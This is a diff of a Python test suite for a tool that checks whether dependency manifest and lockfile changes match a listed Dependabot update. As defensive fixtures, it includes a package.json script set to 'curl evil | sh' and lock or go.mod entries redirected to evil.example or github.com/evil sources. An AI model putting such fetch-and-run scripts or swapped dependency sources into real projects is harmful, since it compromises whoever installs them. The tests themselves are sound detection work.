@@ -1,749 +1,491 @@
-"""Manifest diffs that the listed Dependabot update does not explain."""
+"""plan(): the manifest and lockfile diff is the update list."""
 
 from __future__ import annotations
 
 import json
-import os
 import unittest
-from pathlib import Path
-from tempfile import TemporaryDirectory
-from unittest.mock import patch
 
-import dependency_manifest_diff as manifest
-import dependency_manifest_python as python_manifest
-import dependency_update_coverage as coverage
-import malware_verdict_formatter as formatter
-from manifest_scan_support import _PASS_REVIEW, _bump, _run_listed_scan, _unresolved
-from test_dependency_update_coverage import _clean, _commit, _git
+import dependency_manifest_diff as diff
+from dependency_manifest_diff import Change
+
+_BASE = "base"
 
 
-class DependencyManifestDiffTest(unittest.TestCase):
-    def test_manifest_bump_missing_from_the_parsed_list_is_unresolved(self) -> None:
-        with TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            _git(root, "init", "-b", "main")
-            _git(root, "config", "user.email", "coverage-test@example.com")
-            _git(root, "config", "user.name", "coverage-test")
-            _commit(root, "package.json", "{}\n", "base")
-            _git(root, "checkout", "-b", "pr")
-            _commit(
-                root,
-                "package.json",
-                json.dumps({"dependencies": {"lodash": "4.17.21", "left-pad": "1.3.0"}}) + "\n",
-                "bump package.json",
-            )
-            _commit(
-                root,
-                "package-lock.json",
-                json.dumps(
-                    {
-                        "lockfileVersion": 3,
-                        "packages": {"node_modules/minimist": {"version": "1.2.8"}},
-                    }
-                )
-                + "\n",
-                "bump lock",
-            )
-            _commit(
-                root,
-                "go.mod",
-                "module example.com/app\n\ngo 1.22\n\nrequire github.com/evil/mod v1.2.3\n",
-                "bump go.mod",
-            )
-            _commit(root, "requirements.txt", "requests==2.32.3\n", "bump requirements")
-            updates = [
+def _plan(base: dict[str, str], head: dict[str, str], renames: dict[str, str] | None = None) -> diff.Plan:
+    """plan() over two file maps. A path in only one map was added or deleted; `renames` maps new path to old."""
+    renames = renames or {}
+    old_paths = {new: old for new, old in renames.items()}
+    changed: list[tuple[str, str, str]] = []
+    for path in sorted(set(base) | set(head)):
+        if path in renames.values():
+            continue
+        old = old_paths.get(path, path)
+        if path not in head:
+            changed.append((path, path, "D"))
+        elif old not in base:
+            changed.append((path, path, "A"))
+        elif base[old] != head[path] or old != path:
+            changed.append((old, path, "R" if old != path else "M"))
+
+    def read(revision: str, path: str) -> str:
+        return (base if revision == _BASE else head).get(path, "")
+
+    return diff.plan(changed, read, _BASE)
+
+
+def _package(**sections: dict[str, str]) -> str:
+    return json.dumps({"name": "app", "version": "1.0.0", **sections}, indent=2) + "\n"
+
+
+def _npm_lock(packages: dict[str, str], root: dict[str, str] | None = None) -> str:
+    entries: dict[str, dict] = {"": {"name": "app", "dependencies": root or {}}}
+    for path, version in packages.items():
+        name = path.rsplit("node_modules/", 1)[1]
+        entries[path] = {
+            "version": version,
+            "resolved": f"https://registry.npmjs.org/{name}/-/{name.rsplit('/', 1)[-1]}-{version}.tgz",
+            "integrity": f"sha512-{name}-{version}",
+        }
+    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": entries}, indent=2) + "\n"
+
+
+def _yarn(*stanzas: tuple[str, str]) -> str:
+    body = "".join(
+        f'\n{header}:\n  version "{version}"\n'
+        f'  resolved "https://registry.yarnpkg.com/{header.rsplit("@", 1)[0]}/-/{header.rsplit("@", 1)[0]}-{version}.tgz"\n'
+        for header, version in stanzas
+    )
+    return "# yarn lockfile v1\n" + body
+
+
+class NpmTest(unittest.TestCase):
+    def test_a_declared_dependency_takes_its_versions_from_the_lock(self) -> None:
+        base = {
+            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
+            "package-lock.json": _npm_lock(
                 {
-                    "packageName": "lodash",
-                    "fromVersion": "4.17.20",
-                    "toVersion": "4.17.21",
-                    "upstreamRepo": "lodash/lodash",
-                }
-            ]
-            (root / "dependency_updates.json").write_text(json.dumps(updates), encoding="utf-8")
-            output = root / "github_output.txt"
-            previous = os.getcwd()
-            saved = {key: os.environ.get(key) for key in ("PR_BASE_SHA", "GITHUB_BASE_REF", "GITHUB_OUTPUT", "DCR_OUT")}
-            os.chdir(root)
-            os.environ["PR_BASE_SHA"] = _git(root, "rev-parse", "main")
-            os.environ.pop("GITHUB_BASE_REF", None)
-            os.environ["GITHUB_OUTPUT"] = str(output)
-            os.environ["DCR_OUT"] = str(root)
-            try:
-                with patch.object(coverage, "_clone", lambda *_args, **_kwargs: False):
-                    coverage.main()
-            finally:
-                os.chdir(previous)
-                for key, value in saved.items():
-                    if value is None:
-                        os.environ.pop(key, None)
-                    else:
-                        os.environ[key] = value
-            report = json.loads((root / "malware_scan_report.json").read_text(encoding="utf-8"))
-            self.assertIs(report["scan_conclusive"], False)
-            summary = (root / "malware_scan_summary.md").read_text(encoding="utf-8")
-            for name in ("left-pad", "minimist", "github.com/evil/mod", "requests"):
-                self.assertIn(name, summary, msg=summary)
-            self.assertIn("scan_conclusive=false", output.read_text(encoding="utf-8"))
-
-    def test_unchanged_version_bytes_and_a_dropped_pin_are_unresolved(self) -> None:
-        go_sum = "github.com/spf13/cobra v1.8.1 h1:{hash}\n"
-        go_mod = "module example.com/app\n\ngo 1.22\n\nrequire github.com/spf13/cobra v1.8.1\n"
-        lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/left-pad": {
-                    "version": "1.3.0",
-                    "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
-                    "integrity": "sha512-old",
-                }
-            },
-        }
-        with TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            _git(root, "init", "-b", "main")
-            _git(root, "config", "user.email", "coverage-test@example.com")
-            _git(root, "config", "user.name", "coverage-test")
-            _commit(root, "go.sum", go_sum.format(hash="a" * 43 + "="), "base go.sum")
-            _commit(root, "go.mod", go_mod, "base go.mod")
-            _commit(root, "package-lock.json", json.dumps(lock) + "\n", "base lock")
-            _commit(root, "requirements.txt", "requests==2.31.0\n", "base requirements")
-            _git(root, "checkout", "-b", "pr")
-            _commit(root, "go.sum", go_sum.format(hash="b" * 43 + "="), "same version, new hash")
-            _commit(
-                root,
-                "go.mod",
-                go_mod + "\nreplace github.com/spf13/cobra => github.com/evil/cobra v1.8.1\n",
-                "replace beside the same require",
-            )
-            lock["packages"]["node_modules/left-pad"]["integrity"] = "sha512-new"
-            lock["packages"]["node_modules/left-pad"]["resolved"] = "https://github.com/evil/left-pad/tarball/deadbeef"
-            _commit(root, "package-lock.json", json.dumps(lock) + "\n", "integrity and resolved swap")
-            _commit(
-                root,
-                "requirements.txt",
-                "requests @ git+https://github.com/evil/requests.git@deadbeef\n",
-                "pin replaced by a vcs url",
-            )
-            (root / "dependency_updates.json").write_text("[]", encoding="utf-8")
-            output = root / "github_output.txt"
-            previous = os.getcwd()
-            saved = {key: os.environ.get(key) for key in ("PR_BASE_SHA", "GITHUB_BASE_REF", "GITHUB_OUTPUT", "DCR_OUT")}
-            os.chdir(root)
-            os.environ["PR_BASE_SHA"] = _git(root, "rev-parse", "main")
-            os.environ.pop("GITHUB_BASE_REF", None)
-            os.environ["GITHUB_OUTPUT"] = str(output)
-            os.environ["DCR_OUT"] = str(root)
-            try:
-                coverage.main()
-            finally:
-                os.chdir(previous)
-                for key, value in saved.items():
-                    if value is None:
-                        os.environ.pop(key, None)
-                    else:
-                        os.environ[key] = value
-            report = json.loads((root / "malware_scan_report.json").read_text(encoding="utf-8"))
-            names = {item["package_name"] for item in report["dependencies"]}
-            self.assertEqual(names, {"go.sum", "go.mod", "package-lock.json", "requests"})
-            self.assertTrue(all(item["not_scanned_reason"] == "unresolved" for item in report["dependencies"]))
-            self.assertIs(report["scan_conclusive"], False)
-            self.assertEqual(report["status"], "not_scanned")
-            summary = (root / "malware_scan_summary.md").read_text(encoding="utf-8")
-            for name in ("go.sum", "go.mod", "package-lock.json", "requests"):
-                self.assertIn(name, summary, msg=summary)
-            self.assertNotIn("github.com/spf13/cobra", summary)
-            self.assertNotIn("left-pad", summary)
-
-    def test_listed_version_with_other_manifest_bytes_is_unresolved(self) -> None:
-        lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.20",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
-                    "integrity": "sha512-lodash-old",
+                    "node_modules/lodash": "4.17.20",
+                    "node_modules/qs": "6.5.2",
+                    "node_modules/express/node_modules/lodash": "3.10.0",
                 },
-                "node_modules/minimist": {
-                    "version": "1.2.8",
-                    "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz",
-                    "integrity": "sha512-minimist-old",
-                },
-            },
+                {"lodash": "^4.17.20"},
+            ),
         }
-        go_mod = "module example.com/app\n\ngo 1.22\n\nrequire github.com/spf13/cobra v1.8.0\n"
-        foo_mod_hash = "d" * 43 + "="
-        go_sum = (
-            "github.com/foo/bar v1.0.0 h1:{foo}\n"
-            f"github.com/foo/bar v1.0.0/go.mod h1:{foo_mod_hash}\n"
-            "github.com/spf13/cobra {ver} h1:{cobra}\n"
-            "github.com/spf13/cobra {ver}/go.mod h1:" + ("b" * 43) + "=\n"
+        head = {
+            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
+            "package-lock.json": _npm_lock(
+                {
+                    "node_modules/lodash": "4.17.21",
+                    "node_modules/qs": "6.5.3",
+                    "node_modules/express/node_modules/lodash": "3.10.1",
+                },
+                {"lodash": "^4.17.21"},
+            ),
+        }
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, (Change("npm", ".", "lodash", "4.17.20", "4.17.21"),))
+        self.assertEqual(
+            plan.unchecked,
+            (Change("npm", ".", "lodash", "3.10.0", "3.10.1"), Change("npm", ".", "qs", "6.5.2", "6.5.3")),
         )
-        with TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            _git(root, "init", "-b", "main")
-            _git(root, "config", "user.email", "coverage-test@example.com")
-            _git(root, "config", "user.name", "coverage-test")
-            _commit(
-                root, "package.json", json.dumps({"dependencies": {"lodash": "4.17.20"}}) + "\n", "base package.json"
-            )
-            _commit(root, "package-lock.json", json.dumps(lock) + "\n", "base lock")
-            _commit(root, "go.mod", go_mod, "base go.mod")
-            _commit(
-                root, "go.sum", go_sum.format(foo="a" * 43 + "=", cobra="c" * 43 + "=", ver="v1.8.0"), "base go.sum"
-            )
-            _git(root, "checkout", "-b", "pr")
-            _commit(
-                root, "package.json", json.dumps({"dependencies": {"lodash": "4.17.21"}}) + "\n", "listed lodash bump"
-            )
-            lock["packages"]["node_modules/lodash"]["version"] = "4.17.21"
-            lock["packages"]["node_modules/lodash"]["resolved"] = (
-                "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
-            )
-            lock["packages"]["node_modules/lodash"]["integrity"] = "sha512-lodash-new"
-            lock["packages"]["node_modules/minimist"]["resolved"] = "https://github.com/evil/minimist/tarball/deadbeef"
-            lock["packages"]["node_modules/minimist"]["integrity"] = "sha512-minimist-new"
-            _commit(root, "package-lock.json", json.dumps(lock) + "\n", "lodash bump and minimist swap")
-            _commit(
-                root,
-                "go.mod",
-                go_mod.replace("v1.8.0", "v1.8.1")
-                + "\nreplace github.com/spf13/cobra => github.com/evil/cobra v1.8.1\n",
-                "cobra bump and replace",
-            )
-            _commit(
-                root,
-                "go.sum",
-                go_sum.format(foo="e" * 43 + "=", cobra="f" * 43 + "=", ver="v1.8.1"),
-                "cobra bump and foo hash swap",
-            )
-            updates = [
-                {
-                    "packageName": "lodash",
-                    "fromVersion": "4.17.20",
-                    "toVersion": "4.17.21",
-                    "upstreamRepo": "lodash/lodash",
-                },
-                {
-                    "packageName": "github.com/spf13/cobra",
-                    "fromVersion": "v1.8.0",
-                    "toVersion": "v1.8.1",
-                    "upstreamRepo": "spf13/cobra",
-                },
-            ]
-            (root / "dependency_updates.json").write_text(json.dumps(updates), encoding="utf-8")
-            output = root / "github_output.txt"
-            previous = os.getcwd()
-            saved = {key: os.environ.get(key) for key in ("PR_BASE_SHA", "GITHUB_BASE_REF", "GITHUB_OUTPUT", "DCR_OUT")}
-            os.chdir(root)
-            os.environ["PR_BASE_SHA"] = _git(root, "rev-parse", "main")
-            os.environ.pop("GITHUB_BASE_REF", None)
-            os.environ["GITHUB_OUTPUT"] = str(output)
-            os.environ["DCR_OUT"] = str(root)
-            try:
-                with patch.object(coverage, "_clone", lambda *_args, **_kwargs: False):
-                    coverage.main()
-            finally:
-                os.chdir(previous)
-                for key, value in saved.items():
-                    if value is None:
-                        os.environ.pop(key, None)
-                    else:
-                        os.environ[key] = value
-            report = json.loads((root / "malware_scan_report.json").read_text(encoding="utf-8"))
-            names = {item["package_name"] for item in report["dependencies"]}
-            for path in ("package-lock.json", "go.mod", "go.sum"):
-                self.assertIn(path, names, msg=sorted(names))
-            self.assertNotIn("package.json", names)
-            self.assertIs(report["scan_conclusive"], False)
-            self.assertNotEqual(report["status"], "clean")
-            summary = (root / "malware_scan_summary.md").read_text(encoding="utf-8")
-            for path in ("package-lock.json", "go.mod", "go.sum"):
-                self.assertIn(path, summary, msg=summary)
+        self.assertEqual((plan.gaps, plan.unparsed_locks), ((), ()))
 
-    def test_listed_registry_lock_bump_is_conclusive(self) -> None:
-        base_lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.20",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
-                    "integrity": "sha512-lodash-old",
-                }
-            },
+    def test_a_lockfile_only_bump_of_a_declared_dependency_is_primary(self) -> None:
+        package = _package(devDependencies={"prettier": "^3.0.0"})
+        base = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/prettier": "3.9.8"})}
+        head = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/prettier": "3.9.9"})}
+        self.assertEqual(_plan(base, head).primary, (Change("npm", ".", "prettier", "3.9.8", "3.9.9"),))
+
+    def test_a_transitive_only_bump_is_disclosed_and_nothing_is_primary(self) -> None:
+        package = _package(dependencies={"express": "^4.0.0"})
+        base = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/qs": "6.5.2"})}
+        head = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/qs": "6.5.3"})}
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, ())
+        self.assertEqual(plan.unchecked, (Change("npm", ".", "qs", "6.5.2", "6.5.3"),))
+
+    def test_added_and_removed_lock_copies_are_unchecked_upgrades(self) -> None:
+        package = _package(dependencies={"a": "1.0.0"})
+        base = {
+            "package.json": package,
+            "package-lock.json": _npm_lock({"node_modules/a": "1.0.0", "node_modules/old": "1.0.0"}),
         }
-        head_lock = {
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {
-                    "version": "4.17.21",
-                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
-                    "integrity": "sha512-lodash-new",
-                }
-            },
+        head = {
+            "package.json": package,
+            "package-lock.json": _npm_lock({"node_modules/a": "1.0.0", "node_modules/new": "2.0.0"}),
         }
-        report = _run_listed_scan(
-            {"package-lock.json": json.dumps(base_lock) + "\n"},
-            {"package-lock.json": json.dumps(head_lock) + "\n"},
-            [
-                {
-                    "packageName": "lodash",
-                    "fromVersion": "4.17.20",
-                    "toVersion": "4.17.21",
-                    "upstreamRepo": "lodash/lodash",
-                }
-            ],
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, ())
+        self.assertEqual(
+            plan.unchecked, (Change("npm", ".", "new", "", "2.0.0"), Change("npm", ".", "old", "1.0.0", ""))
         )
-        self.assertIs(report["scan_conclusive"], True)
-        self.assertEqual(report["status"], "clean")
-        self.assertNotIn("dependencies", report)
-        published = formatter.compose_published_review(report, _PASS_REVIEW, "COMPATIBILITY_RECOMMENDATION: Merge\n")
-        self.assertEqual(published["check"], "pass")
-        self.assertIs(published["may_complete"], True)
 
-    def test_listed_lock_wrong_version_label_is_unresolved(self) -> None:
-        old_url = "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"
-        integrity = "sha512-lodash-old"
-        listed = [_bump("lodash", "4.17.20", "4.17.21", "lodash/lodash")]
+    def test_a_lock_without_a_manifest_beside_it_is_a_gap(self) -> None:
+        base = {"web/package-lock.json": _npm_lock({"node_modules/qs": "6.5.2"})}
+        head = {"web/package-lock.json": _npm_lock({"node_modules/qs": "6.5.3"})}
+        plan = _plan(base, head)
+        self.assertEqual((plan.primary, plan.unchecked), ((), ()))
+        self.assertEqual(plan.gaps, (("web/package-lock.json", "unresolved"),))
 
-        def npm(version: str) -> str:
-            body = {
-                "lockfileVersion": 3,
-                "packages": {
-                    "node_modules/lodash": {
-                        "version": version,
-                        "resolved": old_url,
-                        "integrity": integrity,
-                    }
-                },
-            }
-            return json.dumps(body) + "\n"
+    def test_a_manifest_without_a_lock_gives_its_specs(self) -> None:
+        base = {"package.json": _package(dependencies={"left-pad": "1.2.3", "chalk": "^5.0.0"})}
+        head = {"package.json": _package(dependencies={"left-pad": "1.2.4", "chalk": "^5.1.0"})}
+        self.assertEqual(
+            _plan(base, head).primary,
+            (Change("npm", ".", "chalk", "^5.0.0", "^5.1.0"), Change("npm", ".", "left-pad", "1.2.3", "1.2.4")),
+        )
 
-        def yarn(version: str) -> str:
-            return f'lodash@^4.17.20:\n  version "{version}"\n  resolved "{old_url}"\n  integrity "{integrity}"\n'
+    def test_a_manifest_change_the_lock_beside_it_does_not_move_is_a_gap(self) -> None:
+        lock = _npm_lock({"node_modules/chalk": "5.1.2"})
+        base = {"package.json": _package(dependencies={"chalk": "^5.0.0"}), "package-lock.json": lock}
+        head = {"package.json": _package(dependencies={"chalk": "^5.1.0"}), "package-lock.json": lock}
+        self.assertEqual(_plan(base, head), diff.Plan((), (), (("package.json", "unresolved"),), ()))
 
-        for path, render in (
-            ("package-lock.json", npm),
-            ("npm-shrinkwrap.json", npm),
-            ("yarn.lock", yarn),
+    def test_a_name_added_to_the_manifest_but_not_installed_by_the_lock_is_a_gap(self) -> None:
+        base = {
+            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
+            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.20"}),
+        }
+        head = {
+            "package.json": _package(dependencies={"lodash": "^4.17.21", "evil": "1.0.0"}),
+            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.21"}),
+        }
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, (Change("npm", ".", "lodash", "4.17.20", "4.17.21"),))
+        self.assertEqual(plan.gaps, (("package.json", "unresolved"),))
+
+    def _swap(self, path: str, **fields: str) -> diff.Plan:
+        """lodash 4.17.20 -> 4.17.21 with `fields` replaced on the head record at `path`."""
+        package = _package(dependencies={"lodash": "^4.17.20"})
+        base_lock = _npm_lock({"node_modules/lodash": "4.17.20", "node_modules/minimist": "1.2.8"})
+        head_lock = json.loads(_npm_lock({"node_modules/lodash": "4.17.21", "node_modules/minimist": "1.2.8"}))
+        head_lock["packages"][path].update(fields)
+        return _plan(
+            {"package.json": package, "package-lock.json": base_lock},
+            {"package.json": package, "package-lock.json": json.dumps(head_lock)},
+        )
+
+    def test_a_lock_record_that_changed_at_an_unchanged_version_is_a_gap(self) -> None:
+        plan = self._swap("node_modules/minimist", integrity="sha512-other")
+        self.assertEqual((plan.primary, plan.unchecked), ((), ()))
+        self.assertEqual(plan.gaps, (("package-lock.json", "unresolved"),))
+
+    def test_a_copy_installed_from_another_source_is_never_an_exact_registry_version(self) -> None:
+        evil = "https://evil.example/minimist.tgz"
+        plan = self._swap("node_modules/minimist", resolved=evil)
+        self.assertEqual(plan.unchecked, (Change("npm", ".", "minimist", "1.2.8", f"1.2.8 ({evil})"),))
+        for fields in ({"resolved": "https://evil.example/l.tgz"}, {"name": "evil"}):
+            with self.subTest(fields=fields):
+                (primary,) = self._swap("node_modules/lodash", **fields).primary
+                self.assertEqual(primary[:4], ("npm", ".", "lodash", "4.17.20"))
+                self.assertTrue(primary.new.startswith("4.17.21 ("), primary)
+
+    def test_a_git_dependency_moved_to_another_commit_is_not_an_exact_version(self) -> None:
+        package = _package(dependencies={"tool": "github:org/tool"})
+        stanza = (
+            'tool@github:org/tool:\n  version "1.0.0"\n  resolved "https://codeload.github.com/org/tool/tar.gz/{}"\n'
+        )
+        plan = _plan(
+            {"package.json": package, "yarn.lock": stanza.format("a" * 40)},
+            {"package.json": package, "yarn.lock": stanza.format("b" * 40)},
+        )
+        (primary,) = plan.primary
+        self.assertEqual(primary.new, f"1.0.0 (https://codeload.github.com/org/tool/tar.gz/{'b' * 40})")
+
+    def test_a_range_added_to_a_yarn_stanza_header_at_the_same_version_is_a_gap(self) -> None:
+        base = {
+            "package.json": _package(dependencies={"lodash": "^4.17.0"}),
+            "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21")),
+        }
+        head = {
+            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
+            "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21")).replace(
+                "lodash@^4.17.0:", "lodash@^4.17.0, lodash@^4.17.21:"
+            ),
+        }
+        self.assertEqual(
+            _plan(base, head), diff.Plan(gaps=(("package.json", "unresolved"), ("yarn.lock", "unresolved")))
+        )
+
+    def test_a_yarn_header_range_change_alone_is_a_gap(self) -> None:
+        package = _package(dependencies={"lodash": "^4.17.0"})
+        base = {"package.json": package, "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21"))}
+        head = {"package.json": package, "yarn.lock": _yarn(("lodash@^4.17.21", "4.17.21"))}
+        self.assertEqual(_plan(base, head), diff.Plan(gaps=(("yarn.lock", "unresolved"),)))
+
+    def test_a_lock_root_range_change_at_an_unchanged_version_is_a_gap(self) -> None:
+        package = _package(dependencies={"lodash": "^4.17.0"})
+        installed = {"node_modules/lodash": "4.17.21"}
+        base = {"package.json": package, "package-lock.json": _npm_lock(installed, {"lodash": "^4.17.0"})}
+        head = {"package.json": package, "package-lock.json": _npm_lock(installed, {"lodash": "^4.17.21"})}
+        self.assertEqual(_plan(base, head), diff.Plan(gaps=(("package-lock.json", "unresolved"),)))
+
+    def test_a_lock_root_range_that_moves_with_its_version_is_a_primary_change(self) -> None:
+        base = {
+            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
+            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.20"}, {"lodash": "^4.17.20"}),
+        }
+        head = {
+            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
+            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.21"}, {"lodash": "^4.17.21"}),
+        }
+        self.assertEqual(_plan(base, head), diff.Plan(primary=(Change("npm", ".", "lodash", "4.17.20", "4.17.21"),)))
+
+    def test_manifest_text_outside_the_dependency_entries_is_a_gap(self) -> None:
+        base = {"package.json": _package(dependencies={"a": "1.0.0"}, scripts={"test": "jest"})}
+        head = {"package.json": _package(dependencies={"a": "1.0.1"}, scripts={"test": "curl evil | sh"})}
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, ())
+        self.assertEqual(plan.gaps, (("package.json", "unresolved"),))
+
+    def test_unparsable_json_is_a_gap(self) -> None:
+        base = {"package.json": _package(dependencies={"a": "1.0.0"})}
+        head = {"package.json": "{not json"}
+        self.assertEqual(_plan(base, head).gaps, (("package.json", "unresolved"),))
+
+    def test_yarn_stanzas_are_declared_copies(self) -> None:
+        package = _package(dependencies={"ua-parser-js": "^0.7.18"})
+        base = {
+            "package.json": package,
+            "yarn.lock": _yarn(("ua-parser-js@^0.7.18", "0.7.22"), ("minimist@^1.2.0", "1.2.5")),
+        }
+        head = {
+            "package.json": package,
+            "yarn.lock": _yarn(("ua-parser-js@^0.7.18", "0.7.31"), ("minimist@^1.2.0", "1.2.8")),
+        }
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, (Change("npm", ".", "ua-parser-js", "0.7.22", "0.7.31"),))
+        self.assertEqual(plan.unchecked, (Change("npm", ".", "minimist", "1.2.5", "1.2.8"),))
+
+    def test_a_name_with_two_moved_copies_is_not_one_version(self) -> None:
+        package = _package(dependencies={"debug": "^4.0.0"})
+        base = {"package.json": package, "yarn.lock": _yarn(("debug@^4.0.0", "4.3.1"), ("debug@^2.6.9", "2.6.9"))}
+        head = {"package.json": package, "yarn.lock": _yarn(("debug@^4.0.0", "4.3.4"), ("debug@^2.6.9", "2.6.8"))}
+        self.assertEqual(_plan(base, head).primary, (Change("npm", ".", "debug", "2.6.9, 4.3.1", "2.6.8, 4.3.4"),))
+
+    def test_a_yarn_berry_lock_is_a_gap(self) -> None:
+        package = _package(dependencies={"lodash": "^4.17.0"})
+        berry = '__metadata:\n  version: 6\n\n"lodash@npm:^4.17.0":\n  version: {}\n'
+        base = {"package.json": package, "yarn.lock": berry.format("4.17.20")}
+        head = {"package.json": package, "yarn.lock": berry.format("4.17.21")}
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, ())
+        self.assertEqual(plan.gaps, (("yarn.lock", "unresolved"),))
+
+    def test_an_unparsed_lock_beside_a_primary_change_is_disclosed(self) -> None:
+        base = {"package.json": _package(dependencies={"zod": "3.22.0"}), "pnpm-lock.yaml": "lockfileVersion: '9.0'\n"}
+        head = {
+            "package.json": _package(dependencies={"zod": "3.22.4"}),
+            "pnpm-lock.yaml": "lockfileVersion: '9.0'\n#\n",
+        }
+        plan = _plan(base, head)
+        self.assertEqual(plan.primary, (Change("npm", ".", "zod", "3.22.0", "3.22.4"),))
+        self.assertEqual((plan.gaps, plan.unparsed_locks), ((), ("pnpm-lock.yaml",)))
+
+    def test_an_unparsed_lock_with_no_primary_change_beside_it_is_a_gap(self) -> None:
+        package = _package(dependencies={"zod": "^3.22.0"})
+        base = {"package.json": package, "pnpm-lock.yaml": "a\n"}
+        head = {"package.json": package, "pnpm-lock.yaml": "b\n"}
+        plan = _plan(base, head)
+        self.assertEqual((plan.primary, plan.unparsed_locks), ((), ()))
+        self.assertEqual(plan.gaps, (("pnpm-lock.yaml", "unresolved"),))
+
+
+class GoTest(unittest.TestCase):
+    _MOD = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/spf13/cobra {}\n\tgolang.org/x/sys {} // indirect\n)\n"
+
+    @staticmethod
+    def _sum(*lines: tuple[str, str]) -> str:
+        return "".join(f"{module} {version} h1:{module}-{version}=\n" for module, version in lines)
+
+    def _bump(self, base_sum: str, head_sum: str) -> diff.Plan:
+        """cobra v1.8.0 -> v1.8.1 and sys v0.20.0 -> v0.21.0 in go.mod, beside `base_sum` -> `head_sum`."""
+        return _plan(
+            {"go.mod": self._MOD.format("v1.8.0", "v0.20.0"), "go.sum": base_sum},
+            {"go.mod": self._MOD.format("v1.8.1", "v0.21.0"), "go.sum": head_sum},
+        )
+
+    def test_direct_requires_are_primary_and_indirect_requires_are_unchecked(self) -> None:
+        cobra, sys = "github.com/spf13/cobra", "golang.org/x/sys"
+        plan = self._bump(
+            self._sum((cobra, "v1.8.0"), (cobra, "v1.8.0/go.mod"), (sys, "v0.20.0/go.mod")),
+            self._sum((cobra, "v1.8.0/go.mod"), (cobra, "v1.8.1"), (cobra, "v1.8.1/go.mod"), (sys, "v0.21.0/go.mod")),
+        )
+        self.assertEqual(plan.primary, (Change("go", ".", cobra, "v1.8.0", "v1.8.1"),))
+        self.assertEqual(plan.unchecked, (Change("go", ".", sys, "v0.20.0", "v0.21.0"),))
+        self.assertEqual(plan.gaps, ())
+
+    def test_a_go_sum_version_no_go_mod_move_accounts_for_is_unchecked(self) -> None:
+        cobra, other = "github.com/spf13/cobra", "github.com/other/mod"
+        plan = self._bump(
+            self._sum((cobra, "v1.8.0")),
+            self._sum((cobra, "v1.8.1"), (other, "v0.2.0/go.mod")),
+        )
+        self.assertEqual(plan.primary, (Change("go", ".", cobra, "v1.8.0", "v1.8.1"),))
+        self.assertIn(Change("go", ".", other, "", "v0.2.0/go.mod"), plan.unchecked)
+        self.assertEqual(plan.gaps, ())
+
+    def test_a_go_sum_version_outside_the_go_mod_move_is_unchecked(self) -> None:
+        cobra = "github.com/spf13/cobra"
+        plan = self._bump(self._sum((cobra, "v1.8.0")), self._sum((cobra, "v1.9.0")))
+        self.assertIn(Change("go", ".", cobra, "v1.8.0", "v1.9.0"), plan.unchecked)
+
+    def test_a_go_sum_hash_change_at_an_unchanged_version_is_a_gap(self) -> None:
+        cobra = "github.com/spf13/cobra"
+        base_sum = self._sum((cobra, "v1.8.0"), ("golang.org/x/sys", "v0.20.0"))
+        head_sum = base_sum.replace("h1:golang.org/x/sys-v0.20.0=", "h1:other=") + self._sum((cobra, "v1.8.1"))
+        self.assertEqual(self._bump(base_sum, head_sum).gaps, (("go.sum", "unresolved"),))
+
+    def test_a_go_sum_change_alone_is_a_gap_or_unchecked(self) -> None:
+        self.assertEqual(_plan({"go.sum": "a\n"}, {"go.sum": "b\n"}), diff.Plan(gaps=(("go.sum", "unresolved"),)))
+        module = "github.com/spf13/cobra"
+        plan = _plan({"go.sum": self._sum((module, "v1.8.0"))}, {"go.sum": self._sum((module, "v1.8.1"))})
+        self.assertEqual(plan, diff.Plan(unchecked=(Change("go", ".", module, "v1.8.0", "v1.8.1"),)))
+
+    def test_a_directive_or_replace_change_is_a_gap(self) -> None:
+        base = {"go.mod": self._MOD.format("v1.8.0", "v0.20.0")}
+        for head_mod in (
+            base["go.mod"].replace("go 1.22", "go 1.23"),
+            base["go.mod"] + "replace github.com/spf13/cobra => github.com/evil/cobra v1.8.0\n",
         ):
-            with self.subTest(path=path):
-                report = _run_listed_scan({path: render("4.17.20")}, {path: render("9.9.9")}, listed)
-                self.assertFalse(report["scan_conclusive"])
-                self.assertIn(path, _unresolved(report))
-                published = formatter.compose_published_review(
-                    report, _PASS_REVIEW, "COMPATIBILITY_RECOMMENDATION: Merge\n"
-                )
-                self.assertEqual(published["check"], "fail")
-                self.assertIs(published["may_complete"], False)
